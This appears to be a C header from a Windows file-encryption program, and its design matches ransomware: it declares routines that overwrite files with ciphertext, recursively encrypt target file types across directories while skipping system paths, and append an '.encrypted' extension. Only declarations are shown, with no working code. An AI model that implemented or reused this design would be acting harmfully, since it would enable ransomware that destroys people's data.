#pragma once
#include <windows.h>

#define ENC_EXT       ".encrypted"
#define ENC_EXT_LEN   10
#define MAX_FPATH     (MAX_PATH * 2)
#define MAX_DEPTH     32

/* Encrypt a single file at `path` — overwrites with IV + ciphertext */
void EncryptSingleFile(const char *path);

/* Recursively walk `dir` and encrypt all target files */
void EncryptDirectory(const char *dir, int depth);

/* Returns 1 if path matches a target extension */
int IsTargetExtension(const char *path);

/* Returns 1 if path is in a system/skip directory */
int ShouldSkipPath(const char *fullPath);